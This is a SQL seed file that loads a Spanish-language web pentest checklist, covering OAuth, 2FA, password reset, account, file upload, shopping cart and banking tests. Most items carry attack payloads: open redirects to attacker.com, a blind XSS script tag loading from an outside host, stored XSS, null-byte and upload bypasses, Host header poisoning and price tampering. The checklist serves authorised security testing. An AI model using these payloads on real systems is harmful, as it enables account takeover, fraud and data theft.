(4, 'Eludir el límite de velocidad alterando el agente de usuario a agente anónimo', 'Evasión de filtros basados en firmas.\n\n- **Prueba:** Algunos WAF bloquean User-Agents vacíos o de herramientas (`curl`, `python-requests`).\n- **Acción:** Rota el User-Agent en cada petición o usa una cadena aleatoria (`User-Agent: my-browser-v1`).', 11),

(4, 'Eludir el límite de velocidad usando byte nulo', 'Confusión en el backend.\n\n- **Payload:** `username=admin%00`\n- **Teoría:** El sistema de bloqueo registra "admin%00". El sistema de login (escrito en C/C++ backend) lee hasta el null byte y ve "admin".\n- **Resultado:** Puedes atacar la misma cuenta infinitas veces porque el bloqueo no reconoce al usuario real.', 12),

(4, 'Crear una lista de palabras de contraseña usando comando cewl', 'Generación de diccionarios contextuales.\n\n- **Herramienta:** `CeWL` (Custom Word List generator).\n- **Comando:** `cewl -d 2 -m 5 https://target.com -w target_dict.txt`\n- **Uso:** Las empresas suelen usar el nombre de la empresa, productos o año en sus contraseñas (e.g., `Empresa2024!`).', 13),

(4, 'Probar la funcionalidad de inicio de sesión de Oauth', 'Verificación general del flujo OAuth.\n\n\n\n- **Objetivo:** Verificar si la implementación sigue el estándar RFC 6749 o si tiene atajos inseguros.\n- **Check:** ¿Usa `state`? ¿Valida `redirect_uri`? ¿Expira el `code`?', 14),

(4, 'OAuth: Propietario del recurso -> Usuario', 'Definición de rol.\n\n- **Quién es:** El usuario final (la víctima o tú).\n- **Acción:** Es quien hace clic en "Permitir acceso" en la pantalla de consentimiento.', 15),

(4, 'OAuth: Servidor de recursos -> Twitter', 'Definición de rol.\n\n- **Qué es:** La API que tiene los datos del usuario (Google, Facebook, Microsoft).\n- **Seguridad:** Verifica el `access_token` antes de entregar datos.', 16),

(4, 'OAuth: Aplicación cliente -> Twitterdeck.com', 'Definición de rol.\n\n- **Quién es:** La aplicación que estás auditando.\n- **Riesgo:** Si es insegura, puede filtrar tokens o permitir el secuestro de cuentas.', 17),

(4, 'OAuth: Servidor de autorización -> Twitter', 'Definición de rol.\n\n- **Función:** El servidor que muestra el login y emite los tokens.\n- **Punto clave:** Es donde ocurren las vulnerabilidades de `redirect_uri`.', 18),

(4, 'OAuth: client_id -> ID de Twitterdeck', 'Identificador Público.\n\n- **Nota:** No es secreto. Se puede ver en la URL (`?client_id=xyz`).\n- **Prueba:** Intenta cambiar el `client_id` por el de otra aplicación legítima para ver si puedes engañar al usuario.', 19),

(4, 'OAuth: client_secret -> Token secreto', 'Identificador Privado (Password de la App).\n\n- **CRÍTICO:** Nunca debe estar en el código frontend (JS) ni en decompilaciones de APKs móviles.\n- **Impacto:** Si robas el secret, puedes firmar tokens y suplantar a la aplicación.', 20),

(4, 'OAuth: response_type -> Define el tipo de token', 'Tipo de flujo.\n\n- **Code:** `response_type=code` (Más seguro, flujo backend).\n- **Token:** `response_type=token` (Implicit Flow). Deprecado e inseguro. El token viaja en la URL y queda en el historial del navegador.', 21),

(4, 'OAuth: scope -> El nivel de acceso solicitado', 'Permisos solicitados.\n\n- **Prueba:** Intenta manipular el scope. Si la app pide `scope=email`, cámbialo a `scope=admin` o `scope=all`.\n- **Exceso:** Verifica si la app pide más permisos de los necesarios (Privacy violation).', 22),

(4, 'OAuth: redirect_uri -> La URL a la que se redirige al usuario', 'El vector de ataque principal en OAuth.\n\n- **Qué es:** A dónde envía el servidor el `code` o `token` tras el login.\n- **Ataque:** Si no se valida estrictamente, el atacante lo cambia a `attacker.com` y roba el token.', 23),

(4, 'OAuth: state -> Protección principal anti-CSRF', 'Protección Anti-CSRF.\n\n- **Mecanismo:** Un token aleatorio generado por el cliente y verificado al regreso.\n- **Ataque:** Si falta o es estático, un atacante puede vincular SU cuenta de Google/Facebook a la sesión de la víctima.', 24),

(4, 'OAuth: grant_type -> Define el tipo de concesión', 'Método de obtención de token.\n\n- **Tipos:** `authorization_code`, `client_credentials`, `password`, `refresh_token`.\n- **Nota:** El tipo `password` es altamente desaconsejado porque requiere que el usuario entregue sus credenciales a la app cliente.', 25),

(4, 'OAuth: code -> El código de autorización', 'Token temporal de un solo uso.\n\n- **Seguridad:** Debe expirar muy rápido (1-10 min). Debe ser invalidado tras ser usado una vez.\n- **Fuga:** Si se filtra en logs o Referer headers, es crítico.', 26),

(4, 'OAuth: access_token -> El token para hacer solicitudes API', 'La llave maestra temporal.\n\n- **Bearer Token:** "Quien lo porta tiene acceso".\n- **Prueba:** Verifica si expira correctamente y si da acceso a datos de otros usuarios (IDOR con Token válido).', 27),

(4, 'OAuth: refresh_token -> Permite nuevo access_token', 'Persistencia de sesión.\n\n- **Riesgo:** Si un atacante roba el Refresh Token, tiene acceso permanente a la cuenta.\n- **Prueba:** Verifica que revocar el acceso en el proveedor (e.g., Google Security settings) invalide este token.', 28),

(4, 'Fallos de código OAuth: Reutilización del código', 'Vulnerabilidad de implementación.\n\n- **Prueba:** Intercepta la petición de canje de código. Envíala. Luego, intenta enviar el mismo código `auth_code` de nuevo.\n- **Esperado:** Error 400 "Invalid Grant".\n- **Fallo:** Si devuelve un nuevo Access Token, es vulnerable a ataques de repetición.', 29),

(4, 'Fallos de código OAuth: Predecir/Fuerza bruta del código y límite de velocidad', 'Entropía baja.\n\n- **Prueba:** Genera 10 códigos sin usarlos. Analiza si son secuenciales o siguen un patrón temporal.\n- **Fuerza bruta:** Intenta adivinar el código mientras la víctima se está autenticando.', 30),

(4, '¿Es el código para la aplicación X válido para la aplicación Y?', 'Falta de vinculación (Binding).\n\n- **Escenario:** Atacante obtiene un código para "App Maliciosa". Intenta canjearlo en el endpoint de "App Legítima".\n- **Vulnerabilidad:** Si el proveedor no valida el `client_id` asociado al código, se puede loguear falsamente.', 31),

(4, 'Fallos de Redirect_uri de OAuth: La URL no se valida en absoluto', 'Open Redirect Crítico.\n\n- **Prueba:** Cambia `redirect_uri=https://app.com` por `redirect_uri=https://attacker.com`.\n- **Resultado:** Si el usuario es redirigido a tu sitio, robas el `code` que viaja en la URL.\n- **Impacto:** Account Takeover total.', 32),

(4, 'Fallos de Redirect_uri de OAuth: Subdominios permitidos (Subdomain Takeover)', 'Validación laxa (Regex débil).\n\n- **Prueba:** `redirect_uri=https://subdominio-olvidado.target.com`.\n- **Ataque:** Si ese subdominio es vulnerable a Subdomain Takeover o XSS, el atacante puede leer la URL y robar el token.', 33),

(4, 'Fallos de Redirect_uri de OAuth: El host se valida, la ruta no (Encadenar open redirect)', 'Encadenamiento de vulnerabilidades.\n\n- **Escenario:** El sitio valida `target.com` pero no la ruta.\n- **Payload:** `redirect_uri=https://target.com/logout?next=https://attacker.com`.\n- **Flujo:** Auth -> Target (Válido) -> Redirect (Open Redirect) -> Attacker.', 34),

(4, 'Fallos de Redirect_uri de OAuth: El host se valida, la ruta no (Fugas de Referer)', 'Fuga por cabeceras.\n\n- **Escenario:** `redirect_uri=https://target.com/dashboard`.\n- **Condición:** Si `/dashboard` tiene imágenes o scripts externos (`analytics.com`), el navegador envía la URL completa (con el `code`) en el header `Referer` a ese tercero.', 35),

(4, 'Fallos de Redirect_uri de OAuth: Regexes débiles', 'Bypass de filtros de texto.\n\n- **Payloads:**\n  - `target.com.attacker.com`\n  - `attacker.com/target.com`\n  - `target.com@attacker.com`\n- **Objetivo:** Engañar a la expresión regular para que crea que el dominio es confiable.', 36),

(4, 'Fallos de Redirect_uri de OAuth: Fuerza bruta de caracteres codificados URL después del host', 'Ofuscación.\n\n- **Prueba:** Usar caracteres especiales URL-encoded.\n- **Payload:** `https://target.com%252eattacker.com` (Double encoding) o `target.com%00.attacker.com`.', 37),

(4, 'Fallos de Redirect_uri de OAuth: Fuerza bruta de palabras clave de lista blanca después del host', 'Bypass de lista blanca.\n\n- **Escenario:** El desarrollador permite cualquier URL que contenga "facebook".\n- **Payload:** `https://attacker.com/facebook_login.html`.\n- **Resultado:** Pasa el filtro, pero envía el token al atacante.', 38),

(4, 'Fallos de Redirect_uri de OAuth: Validación URI en lugar: usar cargas típicas de open redirect', 'Técnicas clásicas.\n\n- **Payloads:**\n  - `///attacker.com`\n  - `//attacker.com`\n  - `https:attacker.com`\n  - `/\/attacker.com`', 39),

(4, 'Fallos de State de OAuth: ¿Falta parámetro State? (CSRF)', 'Ataque de Login CSRF.\n\n- **Prueba:** Elimina el parámetro `state` de la URL de autorización.\n- **Resultado:** Si el flujo continúa sin error, es vulnerable.\n- **Ataque:** El atacante envía un enlace a la víctima que la loguea en la cuenta del atacante. La víctima guarda sus datos (tarjeta de crédito) en la cuenta del atacante sin saberlo.', 40),

(4, '¿Parámetro State predecible?', 'Falso sentido de seguridad.\n\n- **Análisis:** ¿El `state` es siempre el mismo? ¿Es `state=123`? ¿Es un timestamp?\n- **Requisito:** Debe ser un hash criptográfico aleatorio y único por sesión.', 41),

(4, '¿Se verifica el parámetro State?', 'Validación ausente.\n\n- **Prueba:** Genera un `state` válido. En la respuesta, cámbialo por otro valor.\n- **Fallo:** Si la aplicación cliente lo acepta sin compararlo con el que envió originalmente, la protección es inútil.', 42),

(4, 'OAuth Misc: ¿Se valida el client_secret?', 'Login bypass en App Owner.\n\n- **Prueba:** Al intercambiar el `code` por el `token` (llamada server-to-server), intenta enviar un `client_secret` incorrecto o vacío.\n- **Fallo:** Si devuelve el token, cualquiera puede suplantar a la aplicación.', 43),

(4, 'OAuth Misc: Pre ATO usando registro por número de teléfono en Facebook', 'Account Takeover previo al registro.\n\n- **Escenario:** Facebook permite registrarse con teléfono. La App objetivo confía en el email de Facebook.\n- **Ataque:** Atacante crea cuenta FB con teléfono de la víctima (si FB no valida email). Se loguea en la App objetivo. Si la App une cuentas por email, el atacante entra en la cuenta de la víctima.', 44),

(4, 'OAuth Misc: Sin validación de email Pre ATO', 'Fusión de cuentas insegura.\n\n- **Escenario:** Atacante crea cuenta en la App con `victima@gmail.com` (sin validar email). Luego la víctima intenta loguearse con "Login with Google" (`victima@gmail.com`).\n- **Fallo:** La App detecta el email y une el OAuth a la cuenta controlada por el atacante (password seteado por atacante).', 45),

(4, 'Probar Configuración Incorrecta de 2FA: Manipulación de respuesta', 'Bypass lógico simple.\n\n- **Prueba:** Introduce un código 2FA erróneo. Intercepta la respuesta del servidor (`{"status": "error", "message": "invalid"}`).\n- **Ataque:** Cambia el body a `{"status": "success"}` o cambia el código HTTP 403 a 200 OK.\n- **Resultado:** A veces el frontend te deja pasar basándose solo en esa respuesta.', 46),

(4, 'Probar Configuración Incorrecta de 2FA: Manipulación de código de estado', 'Bypass por código de estado.\n\n- **Prueba:** Si recibes un `401 Unauthorized` al poner mal el código.\n- **Ataque:** Cambia el status a `200 OK` en Burp Suite.\n- **Objetivo:** Engañar al navegador para que cargue la siguiente página.', 47),

(4, 'Probar Configuración Incorrecta de 2FA: Fuga de código 2FA en respuesta', 'Divulgación de información.\n\n- **Prueba:** Trigger del envío de SMS/Email. Revisa la respuesta JSON del servidor.\n- **Fallo:** A veces los desarrolladores devuelven el código generado en la respuesta para "debug" (`{"sent": true, "code": "123456"}`).', 48),

(4, 'Probar Configuración Incorrecta de 2FA: Reutilización de código 2FA', 'Replay Attack.\n\n- **Prueba:** Usa un código 2FA válido para entrar. Haz logout. Intenta usar EL MISMO código para entrar de nuevo.\n- **Regla:** Los códigos OTP (One Time Password) deben quemarse tras el primer uso.', 49),

(4, 'Probar Configuración Incorrecta de 2FA: Falta de protección de fuerza bruta', 'Ataque de fuerza bruta directo.\n\n\n\n- **Espacio:** Un código de 4 dígitos tiene solo 10,000 combinaciones.\n- **Prueba:** Usa Burp Intruder (Turbo Intruder) para probar de 0000 a 9999.\n- **Fallo:** Si no hay bloqueo tras 5 intentos, el bypass es trivial.', 50),

(4, 'Probar Configuración Incorrecta de 2FA: Falta de validación de integridad de código 2FA', 'Falta de chequeo en el backend.\n\n- **Escenario:** Flujo de 2 pasos. Login (Paso 1) -> Genera Token temporal -> 2FA (Paso 2).\n- **Prueba:** Intenta usar el Token temporal del Paso 1 para acceder directamente a endpoints protegidos, saltándote el Paso 2.\n- **Forced Browsing:** Navega a `/home` justo después del login, ignorando el prompt de 2FA.', 51),

(4, 'Probar Configuración Incorrecta de 2FA: Con null o 000000', 'Type Juggling / Lógica débil.\n\n- **Payloads:**\n  - `code=null`\n  - `code=` (vacío)\n  - `code=000000`\n  - `code=false`\n  - Envía el parámetro como array: `code[]=123`\n- **Objetivo:** Crashear la validación o hacer que devuelva `true` por error de tipos (PHP loose comparison).', 52);

-- ==========================================
-- CATEGORÍA: Pruebas de Mi Cuenta (Post-Login) (ID 5)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(5, 'Encontrar parámetro que use el ID de cuenta de usuario activo. Intenta alterarlo', '## IDOR (Insecure Direct Object Reference)\n\nEl ataque más común en paneles de usuario.\n\n- **Prueba:** Captura una petición que cargue tus datos (`/api/profile?id=100`). Cambia el ID a `101`.\n- **Objetivo:** Ver la información PII (Email, Teléfono, Dirección) de otro usuario.\n- **Variante:** Prueba también con GUIDs si son predecibles.', 1),

(5, 'Crear una lista de características que pertenecen solo a la cuenta de usuario', '## Mapeo de Superficie de Ataque\n\nIdentifica funciones privilegiadas.\n\n- **Lista:** Cambio de contraseña, ver historial de pagos, subir foto, gestión de API keys.\n- **Acción:** Intenta acceder a estas funciones desde un usuario con menores privilegios (e.g., Usuario B accediendo a las facturas del Usuario A).', 2),

(5, 'Después de login cambiar ID de correo electrónico y actualizar con cualquier correo electrónico existente', '## Account Takeover (ATO) vía Email\n\n- **Escenario:** El atacante cambia su propio email por el de la víctima.\n- **Prueba:** Loguéate como Atacante. Ve a "Perfil". Cambia tu email a `victima@gmail.com`.\n- **Fallo Crítico:** Si el sistema no valida que el email ya existe o no pide confirmación, podrías secuestrar la cuenta o recibir los correos de reset de password de la víctima.', 3),

(5, 'Abrir imagen de perfil en una nueva pestaña y verificar la URL', '## IDOR en Archivos Estáticos\n\n- **Análisis:** `https://site.com/uploads/user_100/profile.jpg`.\n- **Prueba:** Cambia `user_100` a `user_101`.\n- **Riesgo:** Fuga de privacidad. A veces permite ver documentos sensibles (KYC, DNI) si se almacenan con patrones predecibles.', 4),

(5, 'Verificar opción de eliminación de cuenta si la aplicación la proporciona', '## Broken Function Level Authorization\n\n- **Prueba:** Captura la petición de borrado de cuenta (`POST /delete_account?user_id=123`).\n- **Ataque:** Cambia el ID por el de la víctima o un administrador.\n- **Impacto:** Denegación de servicio permanente para la víctima.', 5),

(5, 'Cambiar ID de correo electrónico, ID de cuenta, parámetro de ID de usuario e intentar hacer fuerza bruta a la contraseña de otros usuarios', '## Password Spraying Horizontal\n\n- **Técnica:** Si el endpoint de login permite identificar usuarios (Enumeration), usa una lista de usuarios válidos y prueba una contraseña común (`Password123`) contra todos ellos.', 6),

(5, 'Verificar si la aplicación se reauthentifica para realizar una operación sensible', '## Defensa en Profundidad\n\n- **Requisito:** Cambiar email, contraseña o 2FA **debe** requerir ingresar la contraseña actual.\n- **Prueba:** Intenta cambiar el email sin poner la contraseña. Si pasa, es una vulnerabilidad (Session Hijacking risk).', 7);

-- ==========================================
-- CATEGORÍA: Pruebas de Recuperación de Contraseña (ID 6)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(6, 'Fallo en invalidar sesión en Logout y restablecimiento de contraseña', '## Gestión de Sesión Persistente\n\n- **Escenario:** Tienes una sesión abierta en el móvil y cambias la contraseña en el PC.\n- **Prueba:** Verifica si la sesión del móvil sigue activa tras el cambio.\n- **Riesgo:** Si te roban la cuenta y cambias la clave, el atacante no pierde el acceso si las sesiones no se matan.', 1),

(6, 'Verificar unicidad del enlace/código de restablecimiento de contraseña olvidada', '## Predicción de Tokens\n\n- **Análisis:** Solicita 5 resets seguidos. Analiza los tokens.\n- **Patrones:** ¿Son secuenciales? ¿Están basados en Base64(Timestamp)?\n- **Ataque:** Si son predecibles, puedes generar un token válido para cualquier usuario sin tener acceso a su email.', 2),

(6, 'Verificar si el enlace de restablecimiento no expira o no', '## Caducidad de Enlace\n\n- **Prueba:** Solicita un reset. Espera 24 horas o usa el enlace después de haber cambiado la contraseña exitosamente.\n- **Regla:** El enlace debe ser de un solo uso (One-Time) y expirar en corto tiempo (15-60 min).', 3),

(6, 'Encontrar parámetro de identificación de cuenta de usuario y alterar Id', '## HPP (HTTP Parameter Pollution) en Reset\n\n- **URL:** `site.com/reset?token=xyz&email=victima@mail.com`.\n- **Ataque:** Cambia el email a `atacante@mail.com`. Si el servidor confía en el parámetro email de la URL en lugar del token, podrías cambiar la contraseña del atacante pero loguearte como la víctima (o viceversa).', 4),

(6, 'Verificar política de contraseña débil', '## Validación de Fortaleza\n\n- **Prueba:** Al resetear, intenta poner `123456` o la misma contraseña que ya tenías (Reutilización).\n- **Check:** ¿Impide usar el nombre de usuario en la contraseña?', 5),

(6, 'Implementación débil de restablecimiento de contraseña El token no se invalida después del uso', '## Replay Attack\n\n- **Prueba:**\n  1. Usa el link de reset y cambia la password.\n  2. Dale "Atrás" en el navegador.\n  3. Intenta cambiar la password de nuevo con el mismo link.\n- **Fallo:** Si funciona, un atacante con acceso a tu historial puede secuestrar la cuenta siempre.', 6),

(6, 'Si el enlace de restablecimiento tiene otro parámetro como fecha y hora, cámbialo', '## Manipulación de Lógica\n\n- **URL:** `.../reset?token=abc&timestamp=1620000000`.\n- **Ataque:** Si el enlace expiró, intenta cambiar el timestamp a una fecha futura o actual para "revivir" el token.', 7),

(6, '¿Se formulan preguntas de seguridad? ¿Cuántos intentos se permiten?', '## Fuerza Bruta a Preguntas de Seguridad\n\n- **OSINT:** "¿Nombre de tu primera mascota?" o "¿Madre soltera?" suelen estar en redes sociales.\n- **Rate Limit:** Verifica si bloquea tras 5 intentos fallidos. Si no, es trivial de adivinar con diccionarios.', 8),

(6, 'Agregar solo espacios en nueva contraseña y contraseña confirmada', '## Input Validation Flaw\n\n- **Payload:** `Password: "   "` (tres espacios).\n- **Fallo:** Algunos backends hacen `trim()` y guardan una contraseña vacía, o permiten espacios puros, lo cual rompe validaciones futuras.', 9),

(6, '¿Muestra la contraseña antigua en la misma página?', '## Divulgación de Información\n\n- **Inspección:** Mira el código fuente (`Ctrl+U`) o campos ocultos (`type="hidden"`) en el formulario de reset.\n- **Fallo:** A veces los desarrolladores precargan la contraseña antigua en el HTML por error.', 10),

(6, 'Preguntar por dos enlaces de restablecimiento de contraseña y usar el anterior', '## Race Condition / Token Management\n\n- **Prueba:** Pide Link A. Inmediatamente pide Link B.\n- **Acción:** Intenta usar el Link A.\n- **Correcto:** El Link A debe morir al generarse el Link B.', 11),

(6, '¿Se destruye la sesión activa al cambiar la contraseña o no?', '## (Duplicado de Item 1 - Revalidación)\n\nVerifica la destrucción de cookies de sesión `PHPSESSID` o `JWT` revocados.', 12),

(6, 'Implementación débil de restablecimiento de contraseña El token de restablecimiento de contraseña se envía por HTTP', '## Intercepción de Tokens (Host Header Injection)\n\n- **Prueba:** Intercepta la petición de "Olvidé mi contraseña". Cambia el header `Host: target.com` a `Host: attacker.com`.\n- **Resultado:** Si el backend construye el link usando el header Host, la víctima recibe un email con `http://attacker.com/reset?token=...`. Si hace click, te regala el token.', 13),

(6, 'Enviar solicitudes continuas de contraseña olvidada para que pueda enviar tokens secuenciales', '## Email Bombing / Token Predictability\n\n- **Prueba:** Usa Burp Intruder para enviar 100 peticiones de reset.\n- **Riesgo 1:** DoS a la cuenta de correo de la víctima (Spam).\n- **Riesgo 2:** Si los tokens son `ABC001`, `ABC002`, puedes adivinar el siguiente.', 14);

-- ==========================================
-- CATEGORÍA: Pruebas de Formulario de Contacto (ID 7)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(7, '¿Se implementa CAPTCHA en el formulario de contacto?', '## Prevención de Spam/Flooding\n\n- **Riesgo:** Si no hay captcha, un bot puede llenar la base de datos de soporte o enviar miles de emails al equipo interno (DoS).', 1),

(7, '¿Permite cargar archivos en el servidor?', '## Unrestricted File Upload (RCE)\n\n- **Prueba:** Intenta subir `shell.php`, `test.exe`, o `test.html`.\n- **Bypass:** Prueba `shell.php.jpg`, `shell.php%00.jpg` o cambia el Content-Type a `image/jpeg`.\n- **Impacto:** Ejecución remota de código (Compromiso total del servidor).', 2),

(7, 'XSS Ciego', '## Ataque Dirigido a Administradores\n\n- **Concepto:** El payload no se ejecuta en tu navegador, sino en el panel de administración cuando el soporte lee tu mensaje.\n- **Payload:** `<script src=//yoursite.xss.ht></script>`.\n- **Herramienta:** `XSS Hunter` o `Burp Collaborator`.', 3);

-- ==========================================
-- CATEGORÍA: Pruebas de Compra de Productos (ID 8)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(8, 'Comprar ahora: Alterar ID de producto para comprar otro producto de alto valor con bajo precio', '## Price Manipulation (Parameter Tampering)\n\n\n\n- **Flujo:** Añade un "Lápiz ($1)" al carrito. Intercepta la petición de "Checkout".\n- **Ataque:** Cambia `product_id=1` (Lápiz) por `product_id=500` (MacBook).\n- **Resultado:** Si el backend confía en el precio del ID original pero procesa el ID nuevo, compras un MacBook por $1.', 1),

(8, 'Comprar ahora: Alterar datos del producto para aumentar el número de producto con el mismo precio', '## Manipulación de Cantidad\n\n- **Payloads:**\n  - `quantity=0.1`\n  - `quantity=-1` (Devolución negativa / Crédito a favor)\n  - `quantity=999999999` (Overflow)\n- **Objetivo:** Pagar menos o recibir dinero del sistema.', 2),

(8, 'Regalo/Cupón: Alterar recuento de regalo/cupón en la solicitud', '## Duplicación de Cupones\n\n- **Prueba:** Si la petición es `voucher_ids=[101]`, intenta `voucher_ids=[101, 101]`.\n- **Fallo:** A veces aplica el descuento dos veces.', 3),

(8, 'Regalo/Cupón: Alterar valor de regalo/cupón para aumentar/disminuir el valor', '## Manipulación de Valor\n\n- **Prueba:** Si el cupón se envía como objeto JSON `{"code": "SAVE10", "value": 10}`, cambia `value` a `100`.\n- **Regla:** El valor debe validarse siempre en el servidor, nunca confiar en el cliente.', 4),

(8, 'Regalo/Cupón: Reutilizar regalo/cupón utilizando valores de regalo antiguos', '## Cupones Caducados\n\n- **Prueba:** Usa un cupón que ya gastaste. O busca códigos de cupones viejos en internet.\n- **Fallo:** El sistema no marca el cupón como "usado" en la base de datos hasta que finaliza el pedido, o olvida validarlo.', 5),

(8, 'Regalo/Cupón: Verificar la unicidad del parámetro regalo/cupón', '## Enumeración de Cupones\n\n- **Fuerza Bruta:** Si los códigos son `GIFT-001`, `GIFT-002`, usa Intruder para encontrar cupones válidos de otros usuarios.', 6),

(8, 'Regalo/Cupón: Usar técnica de contaminación de parámetros para agregar el mismo cupón dos veces', '## HTTP Parameter Pollution (HPP)\n\n- **Payload:** `POST /cart?voucher=SAVE10&voucher=SAVE10`.\n- **Resultado:** Algunos frameworks (ASP.NET) concatenan los valores, otros toman el último, otros el primero. Si la lógica falla, aplica el descuento doble.', 7),

(8, 'Agregar/Eliminar producto del carrito: Alterar ID de usuario para eliminar productos', '## IDOR en Carrito\n\n- **Prueba:** `DELETE /cart/item/5?user_id=123`. Cambia el `user_id`.\n- **Impacto:** Griefing (Borrar el carrito de otros usuarios para molestarlos).', 8),

(8, 'Agregar/Eliminar producto del carrito: Alterar ID de carrito para agregar/eliminar productos', '## Inyección de Artículos\n\n- **Prueba:** Añade un artículo a TU carrito. Cambia el `cart_id` al de la víctima.\n- **Escenario:** Obligar a un usuario a comprar algo (útil en ataques de CSRF/Fishing).', 9),

(8, 'Agregar/Eliminar producto del carrito: Identificar ID de carrito/usuario para ver artículos agregados', '## Fuga de Información (IDOR)\n\n- **Prueba:** `GET /cart?id=123`. Cambia ID.\n- **Impacto:** Ver qué están comprando otros usuarios (Privacidad).', 10),

(8, 'Dirección: Alterar solicitud de BurpSuite para cambiar la dirección de envío de otro usuario', '## IDOR Crítico\n\n- **Prueba:** En la libreta de direcciones, al hacer "Editar" (`POST /address/update`), cambia el `address_id`.\n- **Impacto:** Sobrescribir la dirección de otro usuario. Si compra algo, te llegará a ti.', 11),

(8, 'Dirección: Intentar XSS almacenado agregando vector XSS en dirección de envío', '## Stored XSS\n\n- **Payload:** `<img src=x onerror=alert(1)>` en el campo "Calle" o "Notas".\n- **Víctima:** El administrador del panel de pedidos o el repartidor que ve la etiqueta impresa (si es web).', 12),

(8, 'Dirección: Usar técnica de contaminación de parámetros para agregar dos direcciones de envío', '## Lógica Confusa\n\n- **Prueba:** Enviar dos direcciones distintas en la misma petición HPP.\n- **Objetivo:** Bypasear validaciones de "Dirección no permitida" o corromper la DB.', 13),

(8, 'Realizar pedido: Alterar parámetro de opciones de pago para cambiar el método de pago', '## Evasión de Pago\n\n- **Prueba:** Cambiar `payment_method=CC` (Tarjeta) a `payment_method=COD` (Cash on Delivery) o `INVOICE`.\n- **Objetivo:** Que el sistema procese el pedido sin cobrar la tarjeta inmediatamente.', 14),

(8, 'Realizar pedido: Alterar el valor del monto para manipulación de pagos', '## Manipulación Final del Precio\n\n- **Momento:** Justo antes de conectar con la pasarela (PayPal/Stripe).\n- **Ataque:** Cambia `amount=100.00` a `amount=1.00`.\n- **Verificación:** El sistema debe verificar (callback/webhook) que lo pagado coincida con el total de la orden.', 15),

(8, 'Realizar pedido: Verificar si el CVV está en texto claro o no', '## Cumplimiento PCI-DSS\n\n- **Verificación:** El CVV nunca debe guardarse en logs ni base de datos. Solo debe pasar a la pasarela.\n- **SSL:** Debe viajar encriptado siempre.', 16),

(8, 'Realizar pedido: Verificar si la aplicación procesa los detalles de la tarjeta', '## Seguridad de Pasarela\n\n- **Prueba:** Si el formulario de tarjeta está en `midominio.com`, es peligroso. Lo ideal es que sea un `iframe` o redirección a `stripe.com` o `paypal.com`.', 17),

(8, 'Rastrear pedido: Rastrear el pedido de otro usuario adivinando el número de seguimiento', '## IDOR en Tracking\n\n- **Prueba:** `GET /track/ORD-001`.\n- **Fuerza Bruta:** Iterar números de orden para ver nombres y direcciones de entrega de desconocidos.', 18),

(8, 'Rastrear pedido: Fuerza bruta del prefijo o sufijo del número de seguimiento', '## Predicción de IDs\n\n- **Análisis:** Si el formato es `[FECHA]-[SEQ]`, es fácil generar números válidos.', 19),

(8, 'Lista de deseos: Verificar si el usuario A puede agregar/eliminar productos en la lista de deseos del usuario B', '## IDOR Menor\n\n- **Prueba:** `POST /wishlist/add?user_id=B&product=X` siendo Usuario A.', 20),

(8, 'Lista de deseos: Verificar si el usuario A puede agregar productos al carrito del usuario B desde la lista de deseos', '## Cross-User Interaction\n\n- **Prueba:** Mover item de Wishlist A -> Carrito B mediante manipulación de IDs.', 21),

(8, 'Después de comprar producto: Verificar si el usuario A puede cancelar órdenes para el usuario B', '## IDOR Crítico (Business Logic)\n\n- **Prueba:** Endpoint `/order/cancel`. Parametro `order_id`.\n- **Impacto:** Sabotaje de pedidos legítimos.', 22),

(8, 'Después de comprar producto: Verificar si el usuario A puede ver/verificar órdenes del usuario B', '## Fuga de Historial\n\n- **Prueba:** Acceder a facturas (`/invoice/123.pdf`) iterando números.', 23),

(8, 'Después de comprar producto: Verificar si el usuario A puede modificar la dirección de envío del usuario B', '## Redirección de Pedidos\n\n- **Escenario:** El pedido está "En proceso". El atacante modifica la dirección del pedido ya pagado por la víctima para que le llegue a él.', 24),

(8, 'Fuera de stock: ¿Puede el usuario comprar un producto que está agotado?', '## Race Condition de Inventario\n\n\n\n- **Prueba:** Producto con Stock=1. Dos usuarios (hilos) envían "Comprar" al mismo milisegundo.\n- **Herramienta:** `Burp Turbo Intruder`.\n- **Fallo:** El stock baja a -1 y ambos compran el item.', 25);

-- ==========================================
-- CATEGORÍA: Pruebas de Aplicación Bancaria (ID 9)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(9, 'Actividad de facturación: Verificar si el usuario A puede ver el estado de cuenta del usuario B', '## IDOR Financiero (Acceso a Información)\n\n- **Endpoint:** `/api/statements/download?account=XXXX`.\n- **Prueba:** Cambiar el número de cuenta. Las aplicaciones bancarias suelen usar números de cuenta secuenciales o predecibles.', 1),

(9, 'Actividad de facturación: Verificar si el usuario A puede ver el informe de transacciones del usuario B', '## Fuga de Movimientos\n\n- **Prueba:** Solicitar reporte JSON de movimientos cambiando el `customer_id`.\n- **Impacto:** Espionaje financiero total.', 2),

(9, 'Actividad de facturación: Verificar si el usuario A puede ver el informe resumido del usuario B', '## Resumen de Saldo\n\n- **Objetivo:** Ver el saldo total de la víctima.', 3),

(9, 'Actividad de facturación: Verificar si el usuario A puede registrarse para recibir extracto mensual/semanal por correo electrónico', '## Suscripción No Autorizada\n\n- **Ataque:** Suscribir a la víctima a spam de reportes, o suscribir al atacante para recibir los reportes de la víctima (si se permite poner email arbitrario).', 4),

(9, 'Actividad de facturación: Verificar si el usuario A puede actualizar el ID de correo electrónico existente del usuario B', '## Account Takeover Bancario\n\n- **Crítico:** Si cambias el email, los OTPs y alertas llegarán al atacante.', 5),

(9, 'Depósito/Préstamo/Vinculado: Verificar si el usuario A puede ver el resumen de cuenta de depósito del usuario B', '## IDOR en Productos Vinculados\n\n- **Prueba:** A veces la seguridad está en la cuenta corriente, pero se olvidan de proteger los Préstamos o Plazos Fijos.', 6),

(9, 'Depósito/Préstamo/Vinculado: Verificar alteración del saldo de la cuenta para cuentas de depósito', '## Integridad de Datos\n\n- **Prueba:** Al abrir un depósito, interceptar y cambiar `amount` o `interest_rate`.\n- **Validación:** El backend debe recalcular siempre basándose en reglas estrictas.', 7),

(9, 'Deducción fiscal: Verificar si el usuario A puede ver los detalles de deducción fiscal del usuario B', '## Fuga de Datos Fiscales\n\n- **Información:** Permite ver ingresos anuales, NIF/DNI y domicilio fiscal.', 8),

